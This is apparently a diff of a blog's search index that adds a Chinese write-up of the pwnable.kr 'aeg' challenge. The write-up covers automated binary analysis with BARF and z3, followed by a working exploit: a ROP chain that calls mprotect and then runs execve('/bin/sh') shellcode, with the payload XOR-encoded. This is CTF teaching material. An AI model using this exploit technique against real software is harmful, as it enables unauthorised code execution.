+<h3 id="得到加密部分所异或的值"><a href="#得到加密部分所异或的值" class="headerlink" title="得到加密部分所异或的值"></a>得到加密部分所异或的值</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( i &amp; <span class="number">1</span> )</span><br><span class="line">	byte_4767740[i] ^= <span class="number">0x44</span>u;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    byte_4767740[i] ^= <span class="number">0x7C</span>u;</span><br></pre></td></tr></table></figure>
+
+<p>此处意为，index为奇数，就异或<code>0x44</code>，为偶数，就异或<code>0x7C</code></p>
+<p>因为加密操作在for循环中，所以我们要保存一个退出for循环的branch</p>
+<figure class="image-box">
+                <img src="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200123151950205.png" alt="image-20200123151950205" title class>
+                <p>image-20200123151950205</p>
+            </figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">block = find_block(not_taken_branch, basic_blocks)</span><br><span class="line">block = find_block(block.direct_branch, basic_blocks)</span><br><span class="line">not_taken_branch = block.not_taken_branch</span><br></pre></td></tr></table></figure>
+
+<p>先找到异或加密的块：</p>
+<p>由于全局只有这里一处存在<code>and</code>操作所以可以从<code>basic blocks</code>中搜索目标<code>and eax, 1</code>，就可以得到<code>xor</code>指令附近的块</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> basic_blocks:</span><br><span class="line">    break_flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> instr <span class="keyword">in</span> b.instrs:</span><br><span class="line">        <span class="keyword">if</span> instr.mnemonic == <span class="string">'and'</span> <span class="keyword">and</span> instr.operands[<span class="number">0</span>].to_string() == <span class="string">'eax'</span> <span class="keyword">and</span> instr.operands[<span class="number">1</span>].to_string() == <span class="string">'0x1'</span>:</span><br><span class="line">            block = b</span><br><span class="line">            break_flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> break_flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>这时找到的是这个块</p>
+<figure class="image-box">
+                <img src="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200123152338054.png" alt="image-20200123152338054" title class>
+                <p>image-20200123152338054</p>
+            </figure>
+
+<p>其<code>taken_branch</code>和<code>not_taken_branch</code>分别是对应奇数和偶数的操作，所以：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 奇数</span></span><br><span class="line">j_num = <span class="number">0</span></span><br><span class="line">taken_block = find_block(block.taken_branch, basic_blocks)</span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> taken_block.instrs:</span><br><span class="line">    <span class="keyword">if</span> instr.mnemonic == <span class="string">'xor'</span>:</span><br><span class="line">        s = instr.operands[<span class="number">1</span>].to_string()</span><br><span class="line">        idx = s.index(<span class="string">'0x'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ffffff'</span> <span class="keyword">in</span> s:</span><br><span class="line">            idx += <span class="number">8</span></span><br><span class="line">        j_num = int(instr.operands[<span class="number">1</span>].to_string()[idx:], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 偶数</span></span><br><span class="line">o_num = <span class="number">0</span></span><br><span class="line">not_taken_block = find_block(block.not_taken_branch, basic_blocks)</span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> not_taken_block.instrs:</span><br><span class="line">    <span class="keyword">if</span> instr.mnemonic == <span class="string">'xor'</span>:</span><br><span class="line">        s = instr.operands[<span class="number">1</span>].to_string()</span><br><span class="line">        idx = s.index(<span class="string">'0x'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ffffff'</span> <span class="keyword">in</span> s:</span><br><span class="line">            idx += <span class="number">8</span></span><br><span class="line">        o_num = int(instr.operands[<span class="number">1</span>].to_string()[idx:], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>这里就得到了奇数和偶数分别对应的异或的值</p>
+<h3 id="进入套娃函数sub-45658F0"><a href="#进入套娃函数sub-45658F0" class="headerlink" title="进入套娃函数sub_45658F0"></a>进入套娃函数<code>sub_45658F0</code></h3><p>通过之前保存的<code>not_taken_branch</code>得到该函数所在的块，第二个call就是目标函数的地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">block = find_block(not_taken_branch, basic_blocks)</span><br><span class="line">call_num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> block.instrs:</span><br><span class="line">    <span class="keyword">if</span> instr.mnemonic == <span class="string">'call'</span>:</span><br><span class="line">        <span class="keyword">if</span> call_num == <span class="number">1</span>:</span><br><span class="line">            call_address = int(instr.operands[<span class="number">0</span>].to_string(), <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        call_num += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="指令分析"><a href="#指令分析" class="headerlink" title="指令分析"></a>指令分析</h3><p>这里就是重磅操作了，该类函数中，几乎存在的所有操作都需要分析</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00000000045658F0                 push    rbp</span><br><span class="line">.text:00000000045658F1                 mov     rbp, rsp</span><br><span class="line">.text:00000000045658F4                 sub     rsp, 10h</span><br><span class="line">.text:00000000045658F8                 mov     ecx, esi</span><br><span class="line">.text:00000000045658FA                 mov     eax, edx</span><br><span class="line">.text:00000000045658FC                 mov     [rbp+var_4], dil</span><br><span class="line">.text:0000000004565900                 mov     [rbp+var_8], cl</span><br><span class="line">.text:0000000004565903                 mov     [rbp+var_C], al</span><br><span class="line">.text:0000000004565906                 cmp     [rbp+var_4], 0E4h</span><br><span class="line">.text:000000000456590A                 jnz     short loc_456596F</span><br><span class="line">.text:000000000456590C                 movzx   eax, [rbp+var_4]</span><br><span class="line">.text:0000000004565910                 mov     edx, 2Bh</span><br><span class="line">.text:0000000004565915                 imul    eax, edx</span><br><span class="line">.text:0000000004565918                 sub     al, [rbp+var_8]</span><br><span class="line">.text:000000000456591B                 cmp     al, 2Eh</span><br><span class="line">.text:000000000456591D                 jnz     short loc_456596F</span><br><span class="line">.text:000000000456591F                 movzx   edx, [rbp+var_4]</span><br><span class="line">.text:0000000004565923                 mov     eax, edx</span><br><span class="line">.text:0000000004565925                 shl     eax, 3</span><br><span class="line">.text:0000000004565928                 add     eax, edx</span><br><span class="line">.text:000000000456592A                 shl     eax, 2</span><br><span class="line">.text:000000000456592D                 mov     ecx, eax</span><br><span class="line">.text:000000000456592F                 movzx   edx, [rbp+var_8]</span><br><span class="line">.text:0000000004565933                 mov     eax, edx</span><br><span class="line">.text:0000000004565935                 shl     eax, 2</span><br><span class="line">.text:0000000004565938                 add     eax, edx</span><br><span class="line">.text:000000000456593A                 shl     eax, 3</span><br><span class="line">.text:000000000456593D                 add     eax, edx</span><br><span class="line">.text:000000000456593F                 add     eax, ecx</span><br><span class="line">.text:0000000004565941                 sub     al, [rbp+var_C]</span><br><span class="line">.text:0000000004565944                 cmp     al, 62h</span><br><span class="line">.text:0000000004565946                 jnz     short loc_456596F</span><br><span class="line">.text:0000000004565948                 movzx   eax, cs:byte_4767745</span><br><span class="line">.text:000000000456594F                 movzx   edx, al</span><br><span class="line">.text:0000000004565952                 movzx   eax, cs:byte_4767744</span><br><span class="line">.text:0000000004565959                 movzx   ecx, al</span><br><span class="line">.text:000000000456595C                 movzx   eax, cs:byte_4767743</span><br><span class="line">.text:0000000004565963                 movzx   eax, al</span><br><span class="line">.text:0000000004565966                 mov     esi, ecx</span><br><span class="line">.text:0000000004565968                 mov     edi, eax</span><br><span class="line">.text:000000000456596A                 call    sub_4565870</span><br><span class="line">.text:000000000456596F</span><br><span class="line">.text:000000000456596F loc_456596F:                            ; CODE XREF: sub_45658F0+1A↑j</span><br><span class="line">.text:000000000456596F                                         ; sub_45658F0+2D↑j ...</span><br><span class="line">.text:000000000456596F                 nop</span><br><span class="line">.text:0000000004565970                 leave</span><br><span class="line">.text:0000000004565971                 retn</span><br></pre></td></tr></table></figure>
+
+<p>我选择分析从第四条指令开始到第三个<code>jnz</code>之前的除去<code>jnz</code>的所有操作</p>
+<h4 id="预备操作"><a href="#预备操作" class="headerlink" title="预备操作"></a>预备操作</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">to_to = &#123;<span class="string">'eax'</span>: <span class="string">'al'</span>, <span class="string">'ebx'</span>: <span class="string">'bl'</span>, <span class="string">'ecx'</span>: <span class="string">'cl'</span>, <span class="string">'edx'</span>: <span class="string">'dl'</span>, <span class="string">'edi'</span>: <span class="string">'dil'</span>&#125;</span><br><span class="line">tv = list(to_to.values())</span><br><span class="line">tk = list(to_to.keys())</span><br></pre></td></tr></table></figure>
+
+<p>因为这里所有涉及的运算操作都是byte为单位的，eax和al在这里并无太大运算上的区别，所以在这里做一个映射，把<code>al</code>都看作<code>eax</code>，以此类推</p>
+<h4 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h4><ul>
+<li><p>生成一个<code>z3</code>的<code>Solver</code></p>
+</li>
+<li><p>分别生成<code>eax</code>等寄存器的8位的<code>BitVec</code></p>
+</li>
+<li><p>设置一个字典来保存各指令的参数的值</p>
+</li>
+<li><p>分析各条指令，分别对<code>mov movzx add sub shl imul lea call cmp</code>指令进行分析一般来说已足够。指令分析过程要先分析出源操作数和目标操作数，如果是寄存器或者类似于<code>[rbp-4]</code>之类的，将其视为一个变量名，并检查参数字典中是否有该变量。如果有，则取出作为操作数，如果无，则生成以变量名为名的8位<code>BitVec</code>，然后依据相应指令所做的操作进行运算</p>
+</li>
+<li><p>指令的操作类型非常有限，这就为我们的分析提供了非常有利的条件</p>
+</li>
+<li><p>遇到第三个jnz的时候，其后所有指令除了<code>call</code>以外全部跳过</p>
+</li>
+<li><p>分析到<code>call</code>的时候，取出<code>call</code>的地址，然后再来一轮针对该<code>call</code>的分析</p>
+</li>
+<li><p>分析到<code>memcpy</code>的时候，分析得到<code>dest</code>距离<code>rbp</code>的距离，存为变量size</p>
+</li>
+</ul>
+<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ans = []</span><br><span class="line">size = <span class="number">0</span>	<span class="comment"># dest相对rbp的距离</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    s = Solver()</span><br><span class="line">    eax = BitVec(<span class="string">'eax'</span>, <span class="number">8</span>)</span><br><span class="line">    ebx = BitVec(<span class="string">'ebx'</span>, <span class="number">8</span>)</span><br><span class="line">    ecx = BitVec(<span class="string">'ecx'</span>, <span class="number">8</span>)</span><br><span class="line">    edx = BitVec(<span class="string">'edx'</span>, <span class="number">8</span>)</span><br><span class="line">    edi = BitVec(<span class="string">'edi'</span>, <span class="number">8</span>)</span><br><span class="line">    esi = BitVec(<span class="string">'esi'</span>, <span class="number">8</span>)</span><br><span class="line">    V = &#123;<span class="string">'eax'</span>: eax, <span class="string">'ebx'</span>: ebx, <span class="string">'ecx'</span>: ecx,</span><br><span class="line">         <span class="string">'edx'</span>: edx, <span class="string">'edi'</span>: edi, <span class="string">'esi'</span>: esi&#125;</span><br><span class="line">    log(<span class="string">"exec call"</span>, call_address)</span><br><span class="line">    cfg = barf.recover_cfg(start=call_address)</span><br><span class="line">    <span class="keyword">if</span> len(cfg.basic_blocks) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> instr <span class="keyword">in</span> cfg.basic_blocks[<span class="number">0</span>].instrs:</span><br><span class="line">            <span class="keyword">if</span> instr.mnemonic == <span class="string">'lea'</span>:</span><br><span class="line">                op2 = instr.operands[<span class="number">1</span>].to_string()</span><br><span class="line">                obj = re.search(<span class="string">r"\[(\S+)\]"</span>, op2)</span><br><span class="line">                s = obj.groups()[<span class="number">0</span>]</span><br><span class="line">                size = int(s.strip(<span class="string">' '</span>).split(<span class="string">'-'</span>)[<span class="number">1</span>], <span class="number">16</span>)+<span class="number">8</span></span><br><span class="line">        print(<span class="string">"[+] reach the target!"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    continue_flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> addr, asm_instr, reil_instrs <span class="keyword">in</span> barf.translate(cfg.start_address+<span class="number">8</span>, cfg.end_address):</span><br><span class="line">        <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'call'</span>:</span><br><span class="line">            <span class="keyword">if</span> isinstance(s.check(), z3.z3.CheckSatResult):</span><br><span class="line">                md = s.model()</span><br><span class="line">                print(md)</span><br><span class="line">                edi_val = md.eval(edi).as_long()</span><br><span class="line">                esi_val = md.eval(esi).as_long()</span><br><span class="line">                edx_val = md.eval(edx).as_long()</span><br><span class="line">                log(<span class="string">"found 0: "</span>, edi_val)</span><br><span class="line">                log(<span class="string">"found 1: "</span>, esi_val)</span><br><span class="line">                log(<span class="string">"found 2: "</span>, edx_val)</span><br><span class="line">                ans.append(edi_val)</span><br><span class="line">                ans.append(esi_val)</span><br><span class="line">                ans.append(edx_val)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">"[-] unsat!"</span>)</span><br><span class="line">            call_address = int(asm_instr.operands[<span class="number">0</span>].to_string(), <span class="number">16</span>)</span><br><span class="line">            s.reset()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> len(asm_instr.operands) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            op1 = asm_instr.operands[<span class="number">0</span>].to_string()</span><br><span class="line">            op2 = asm_instr.operands[<span class="number">1</span>].to_string()</span><br><span class="line">            <span class="keyword">if</span> op1 <span class="keyword">in</span> tv:</span><br><span class="line">                op1 = tk[tv.index(op1)]</span><br><span class="line">            <span class="keyword">if</span> op2 <span class="keyword">in</span> tv:</span><br><span class="line">                op2 = tk[tv.index(op2)]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'rip'</span> <span class="keyword">in</span> op2:</span><br><span class="line">                continue_flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> continue_flag:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            Sobj1 = re.search(<span class="string">r"\[(\S+)\]"</span>, op1)</span><br><span class="line">            <span class="keyword">if</span> is_num(op2):</span><br><span class="line">                var2_var = int(op2, <span class="number">16</span>)</span><br><span class="line">                V[op2] = var2_var</span><br><span class="line">                Sobj2 = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Sobj2 = re.search(<span class="string">r"\[(\S+)\]"</span>, op2)</span><br><span class="line">            <span class="keyword">if</span> Sobj1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                var1_name = op1</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var1_name = Sobj1.groups()[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> var1_name <span class="keyword">in</span> V.keys():</span><br><span class="line">                var1_var = V[var1_name]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var1_var = BitVec(var1_name, <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">if</span> Sobj2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                var2_name = op2</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var2_name = Sobj2.groups()[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> var2_name <span class="keyword">in</span> V.keys():</span><br><span class="line">                var2_var = V[var2_name]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var2_var = BitVec(var2_name, <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'mov'</span> <span class="keyword">or</span> asm_instr.mnemonic == <span class="string">'movzx'</span>:</span><br><span class="line">                var1_var = var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'cmp'</span>:</span><br><span class="line">                s.add(var1_var == var2_var)</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'add'</span>:</span><br><span class="line">                var1_var += var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'sub'</span>:</span><br><span class="line">                var1_var -= var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'imul'</span>:</span><br><span class="line">                var1_var *= var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'shl'</span>:</span><br><span class="line">                var1_var &lt;&lt;= var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'lea'</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'*'</span> <span class="keyword">in</span> var2_name:</span><br><span class="line">                    vs = var2_name.strip(<span class="string">' '</span>).split(<span class="string">'*'</span>)</span><br><span class="line">                    var2_name = vs[<span class="number">0</span>].replace(<span class="string">'r'</span>, <span class="string">'e'</span>)</span><br><span class="line">                    <span class="keyword">if</span> var2_name <span class="keyword">in</span> V.keys():</span><br><span class="line">                        var2_var = V[var2_name]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        var2_var = BitVec(var2_name, <span class="number">8</span>)</span><br><span class="line">                    var2_var *= int(vs[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'+'</span> <span class="keyword">in</span> var2_name:</span><br><span class="line">                    vs = var2_name.strip(<span class="string">' '</span>).split(<span class="string">'+'</span>)</span><br><span class="line">                    v1 = vs[<span class="number">0</span>].replace(<span class="string">'r'</span>, <span class="string">'e'</span>)</span><br><span class="line">                    v2 = vs[<span class="number">1</span>].replace(<span class="string">'r'</span>, <span class="string">'e'</span>)</span><br><span class="line">                    <span class="keyword">if</span> v1 <span class="keyword">in</span> tk:</span><br><span class="line">                        var1 = V[v1]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        var1 = int(v1, <span class="number">16</span>)</span><br><span class="line">                    <span class="keyword">if</span> v2 <span class="keyword">in</span> tk:</span><br><span class="line">                        var2 = V[v2]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        var2 = int(v2, <span class="number">16</span>)</span><br><span class="line">                    var2_var = var1</span><br><span class="line">                    var2_var += var2</span><br><span class="line">                var1_var = var2_var</span><br><span class="line">            V[var1_name] = var1_var</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>程序非常贴心地导入了mprotect</strong>，所以我们可以通过利用<code>mprotect</code>将加密后数据的地址所存在的页的属性变为<code>RWX</code>，然后跳入这里执行<code>shellcode</code>完成利用</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(binary_name)</span><br><span class="line">gadget = <span class="string">''</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> ans]).ljust(len(ans)+size, <span class="string">'\x00'</span>)</span><br><span class="line">gadget += p64(init_addr1)</span><br><span class="line">gadget += csu(<span class="number">0</span>, <span class="number">1</span>, elf.got[<span class="string">'mprotect'</span>], <span class="number">7</span>, <span class="number">0x1000</span>, inp_address&amp;(~<span class="number">0xfff</span>))</span><br><span class="line">gadget += p64(init_addr2) + p64(<span class="number">0</span>)</span><br><span class="line">gadget += csu(<span class="number">0</span>, <span class="number">1</span>, inp_address+<span class="number">0x200</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">gadget += p64(init_addr2)</span><br><span class="line">gadget = gadget.ljust(<span class="number">0x200</span>, <span class="string">'\x00'</span>)</span><br><span class="line">gadget += p64(inp_address+<span class="number">0x208</span>)</span><br><span class="line">shellcode = <span class="string">"""</span></span><br><span class="line"><span class="string">    mov rdi, 0x0068732f6e69622f</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    lea rdi, [rsp]</span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, SYS_execve</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">gadget = gadget + shellcode</span><br></pre></td></tr></table></figure>
+
+<p>最后不能忘了还要将<code>payload</code>解密，编码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(gadget)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">        c = hex(ord(gadget[i]) ^ j_num)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c = hex(ord(gadget[i]) ^ o_num)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">'0'</span>)</span><br><span class="line">    payload += c</span><br><span class="line">    </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>就可以<code>get shell</code>了</p>
+<p>脚本在[Github]([<a href="https://github.com/DayJun/Blogs/blob/master/Articles/pwnable.kr%20aeg/aeg.py]" target="_blank" rel="noopener">https://github.com/DayJun/Blogs/blob/master/Articles/pwnable.kr%20aeg/aeg.py]</a>(<a href="https://github.com/DayJun/Blogs/blob/master/Articles/pwnable.kr" target="_blank" rel="noopener">https://github.com/DayJun/Blogs/blob/master/Articles/pwnable.kr</a> aeg/aeg.py))</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>做出这道题之前，本打算用angr来解题，但是由于对angr的API不熟悉，学习成本很大，因此改用我相对熟悉的barf来辅助分析，收获不算颇丰，但做出这道题挺舒服的</p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>aeg</tag>
       </tags>
   </entry>
   <entry>
@@ -1218,8 +1516,8 @@
         <category>writeup</category>
       </categories>
       <tags>
-        <tag>pwn</tag>
         <tag>CTF</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -1313,8 +1611,8 @@
         <category>browser</category>
       </categories>
       <tags>
-        <tag>pwn</tag>
         <tag>CTF</tag>
+        <tag>pwn</tag>
         <tag>chrome</tag>
         <tag>v8</tag>
       </tags>
@@ -1376,8 +1674,8 @@
         <category>学习日记</category>
       </categories>
       <tags>
-        <tag>pwn</tag>
         <tag>malloc</tag>
+        <tag>pwn</tag>
         <tag>free</tag>
       </tags>
   </entry>
@@ -1462,8 +1760,8 @@
         <category>writeup</category>
       </categories>
       <tags>
-        <tag>pwn</tag>
         <tag>CTF</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
